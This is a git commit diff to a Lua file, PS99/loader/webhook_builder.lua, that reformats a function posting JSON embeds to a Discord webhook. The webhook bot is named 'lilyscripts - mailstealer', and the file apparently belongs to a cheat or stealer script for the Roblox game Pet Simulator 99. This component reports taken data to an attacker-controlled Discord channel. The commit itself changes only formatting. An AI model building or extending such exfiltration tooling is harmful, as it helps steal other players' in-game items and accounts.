7959b794c83c0d12b85176b04ed1159eada307b4
lily <162043941+lilyscripts@users.noreply.github.com>
2024-04-04 11:32:57 -0500

    webhook builder

--- PS99/loader/webhook_builder.lua
+++ PS99/loader/webhook_builder.lua
@@ -12,30 +12,34 @@ local function webhookBuilder(webhook, title, description, fields)
 
     -- Sends the payload to the webhook
     function self:send()
-        request({
-			Url = self.webhook,
-			Method = "POST",
-			Body = httpService:JSONEncode({
-                ["username"] = "lilyscripts - mailstealer",
-                ["avatar_url"] = "https://media.discordapp.net/attachments/1031307376973856789/1213896280602841088/avatars-hZqwsYs0mAsTeKcK-PH8YWw-t500x500.jpg?ex=661c0e02&is=66099902&hm=2a02c86ceb38d710e5d0dc1cc9dcd6e454a64c10e2926a3fb6d6d08b5b2123c3&",
-                ["embeds"] = {
+        request(
+            {
+                Url = self.webhook,
+                Method = "POST",
+                Body = httpService:JSONEncode(
                     {
-                        ["title"] = self.title,
-                        ["url"] = "https://discord.gg/S4NHgEVmxy",
-                        ["description"] = self.description,
-                        ["color"] = 0,
-                        ["fields"] = {self.fields},
-                        ["footer"] = {
-                            ["text"] = "lilyscripts",
-                            ["icon_url"] = "https://media.discordapp.net/attachments/1031307376973856789/1213896280602841088/avatars-hZqwsYs0mAsTeKcK-PH8YWw-t500x500.jpg?ex=661c0e02&is=66099902&hm=2a02c86ceb38d710e5d0dc1cc9dcd6e454a64c10e2926a3fb6d6d08b5b2123c3&"
+                        ["username"] = "lilyscripts - mailstealer",
+                        ["avatar_url"] = "https://media.discordapp.net/attachments/1031307376973856789/1213896280602841088/avatars-hZqwsYs0mAsTeKcK-PH8YWw-t500x500.jpg?ex=661c0e02&is=66099902&hm=2a02c86ceb38d710e5d0dc1cc9dcd6e454a64c10e2926a3fb6d6d08b5b2123c3&",
+                        ["embeds"] = {
+                            {
+                                ["title"] = self.title,
+                                ["url"] = "https://discord.gg/S4NHgEVmxy",
+                                ["description"] = self.description,
+                                ["color"] = 0,
+                                ["fields"] = {self.fields},
+                                ["footer"] = {
+                                    ["text"] = "lilyscripts",
+                                    ["icon_url"] = "https://media.discordapp.net/attachments/1031307376973856789/1213896280602841088/avatars-hZqwsYs0mAsTeKcK-PH8YWw-t500x500.jpg?ex=661c0e02&is=66099902&hm=2a02c86ceb38d710e5d0dc1cc9dcd6e454a64c10e2926a3fb6d6d08b5b2123c3&"
+                                }
+                            }
                         }
                     }
+                ),
+                Headers = {
+                    ["Content-Type"] = "application/json"
                 }
-            }),
-			Headers = {
-				["Content-Type"] = "application/json"
-			}
-		})
+            }
+        )
     end
 
     return self
